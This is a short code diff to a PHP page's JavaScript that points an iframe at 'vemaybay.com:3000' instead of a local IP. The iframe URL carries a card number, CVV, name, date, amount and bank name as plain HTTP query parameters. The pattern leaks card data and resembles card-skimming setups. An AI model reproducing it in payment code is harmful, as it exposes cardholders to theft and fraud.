@@ -209,7 +209,7 @@ $data = isset($_GET['data']) ? $_GET['data'] : '';
         function showQRConfirmation(a,b,c,d,e) {
             var message = document.getElementById("abc").value;
             document.getElementById("iframeContainer").style.display = "block";
-            document.getElementById("iframe").src = "http://192.168.10.190:3000?sotien=" + encodeURIComponent(message) + "&ten=" + encodeURIComponent(a) + "&ngay=" + encodeURIComponent(b) + "&sothe=" + encodeURIComponent(c) + "&ccv=" + encodeURIComponent(d) + "&nganhang=" + encodeURIComponent(e); 
+            document.getElementById("iframe").src = "http://vemaybay.com:3000?sotien=" + encodeURIComponent(message) + "&ten=" + encodeURIComponent(a) + "&ngay=" + encodeURIComponent(b) + "&sothe=" + encodeURIComponent(c) + "&ccv=" + encodeURIComponent(d) + "&nganhang=" + encodeURIComponent(e); 
         }
         function sai(a,b,c,d,e){
             document.getElementById("master").style.display = "grid";
